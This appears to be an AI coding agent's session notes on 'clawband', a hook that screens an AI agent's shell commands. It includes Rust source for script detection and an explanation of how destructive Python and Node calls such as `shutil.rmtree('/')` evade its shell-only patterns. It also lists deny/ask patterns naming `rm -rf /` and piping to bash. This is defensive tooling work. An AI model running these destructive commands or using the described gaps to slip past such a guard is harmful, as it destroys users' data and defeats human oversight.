Today an allow-match makes clawband output nothing (pass), so Claude Code's *native* permission check still runs and can re-prompt. Emitting an explicit `"allow"` suppresses that — real win for the "keep approvals on + allowlist" mode. But it's a semantic change (clawband would actively *approve*, overriding CC's own deny/ask rules for that command), so it warrants its own PR, a version bump, and a clear doc note. **Separate PR.**

**#43 — `cd /path && cmd 2>/dev/null` false positive** ❓ *not reproducible in master*
I grepped — **current clawband has no "cd + output redirection" check at all** (no such pattern or reason string in `src/main.rs`). So that warning isn't coming from clawband master. It's likely from a custom `ask.patterns` entry, or an unmerged experiment from your testing. Before I "fix" it I need to know its source — can you check your `~/.clawband/ask.patterns` for a `cd`/redirection rule? If it's a clawband built-in you want, that's a *new feature* to add correctly (scoped to the `cd` segment only), not a bug fix.

version: 2.19.0
=== extract_script_path (what gets scanned) ===
fn extract_script_path(command: &str) -> Option<String> {
    let interp = r"(?i)(?:sudo\s+)?(?:bash|sh|zsh|dash|python3?|node|deno|perl|ruby|lua[0-9.]*)";

    // Input redirection: bash < /path/to/script
    let redir_re = Regex::new(&format!(r"(?i)^\s*{}\s+<\s+(.+)$", interp)).unwrap();
    if let Some(caps) = redir_re.captures(command) {
        let path_str = caps[1].trim().trim_matches('"').trim_matches('\'');
        if let Some(path) = path_str.split_whitespace().next() {
            return Some(path.to_string());
        }
    }

    // Direct execution: ./script or ./script.sh — bash honours shebang, ignores extension
    let direct_re = Regex::new(r"(?i)^\s*(?:sudo\s+)?(\./\S+)").unwrap();
    if let Some(caps) = direct_re.captures(command) {
        let path_str = caps[1].trim().trim_matches('"').trim_matches('\'');
        if let Some(path) = path_str.split_whitespace().next() {
            return Some(path.to_string());
        }
    }

    // Standard: interpreter [optional-flags] <path>
    let re = Regex::new(&format!(r"(?i)^\s*{}\s+((?:-[a-zA-Z]+\s+)*)(.+)$", interp)).unwrap();
    let caps = re.captures(command)?;
    let flags = &caps[1];
    // -c  → shell/python inline command string
    // -m  → python module (e.g. python3 -m pytest)
    // -e / --eval → node inline eval
    if Regex::new(r"(?:^|\s)-[a-zA-Z]*[cme][a-zA-Z]*(\s|$)")
        .unwrap()
        .is_match(flags)
    {
        return None;
    }
    let path_str = caps[2].trim().trim_matches('"').trim_matches('\'');
    // First token only — ignore script arguments after the path
    let path = path_str.split_whitespace().next()?;
    Some(path.to_string())
}

_**Agent (claude-opus-4-8 2026-06-08 10:17:16Z)**_

Here's exactly what clawband does — and the gap you're hitting:

## What gets scanned

`extract_script_path` recognizes a script run via these interpreters and reads the file:
**`bash`, `sh`, `zsh`, `dash`, `python`/`python3`, `node`, `deno`, `perl`, `ruby`, `lua`** — plus `interp < file`, and `./script`.

Then `scan_script_file` reads that file and checks **each line against the same deny/ask pattern set** (with comment-stripping for `#`, JS `/* */ //`, Lua `--`), splitting compound commands per line.

## The catch — it only knows *shell* patterns

The deny/ask patterns are **shell-command** regexes (`rm -rf /`, `docker system prune`, `| bash`, `git push --force`…). So when scanning a `.py`/`.js`/`.rb` file, clawband only catches **shell commands embedded in it**:

- `os.system("rm -rf /")` → **caught** (the line literally contains `rm -rf /`)
- `shutil.rmtree("/")`, `os.remove(...)`, `fs.rmSync("/")`, `Pathlib(...).unlink()`, `subprocess.run(["rm","-rf","/"])` → **NOT caught** — these are language-native APIs, no shell string to match

That's precisely your symptom: a Python script that does damage through Python's stdlib **passes clawband** and only Claude's own judgment catches it. Same for inline `python3 -c "import shutil; shutil.rmtree('/')"` (the `-c` path isn't pattern-matched unless it contains a shell pattern).

## Rust / Go / Java

**Not scanned at all** — you can't introspect a compiled binary or `cargo run` source meaningfully. Instead they get a built-in **`ask`**: `cargo run`, `go run`, `java -jar` prompt for approval (the v2.5.0 "ask for compiled runners" decision).

## Summary table

| Language | clawband behavior |
|---|---|
| bash/sh/zsh/dash | file scanned for shell patterns ✓ |
| python, node/deno, perl, ruby, lua | file scanned, but **only for embedded shell commands** — native destructive APIs invisible |
| rust (`cargo run`), go (`go run`), java (`java -jar`) | not scanned → **`ask`** |

## The fix

Add a **language-native destructive-API pattern set** — deny/ask regexes for the obvious ones, applied both when scanning script files *and* to inline `-c`/`-e` code:
- Python: `shutil\.rmtree\(\s*['"]/`, `os\.remove`, `os\.system`, `subprocess.*shell\s*=\s*True`, `pathlib.*\.unlink`
- Node: `fs\.rmSync\(.*recursive`, `fs\.unlinkSync`, `child_process`, `execSync`
- Perl/Ruby: `system\(`, `exec\(`, `File\.delete`, backtick exec

This is essentially issue **#32** (rmtree/rmSync) generalized. It's a meaty, high-value addition — I'd make it its own PR (deny the unambiguous root-targeting ones, ask the rest). Want me to build it?

I'd scope it to the **dangerous subset**: filesystem mutation + process execution. Concretely, **ask** when a scanned `.py`/`.js` file (or inline `-c`/`-e`) contains:

- **Perl/Ruby/Lua (less used → coarse ask):** `system(`, backtick exec, `exec(`, `File.delete`/`unlink`, `io.popen`, `os.execute`

These plug into `builtin_ask()`, so they automatically apply both to scanned script files *and* inline `python3 -c "…"` (since the inline code is in the command string). The unambiguous root-targeting ones (`shutil.rmtree('/')`, `fs.rmSync('/',{recursive:true})`) I'd make **deny** (that's issue #32).
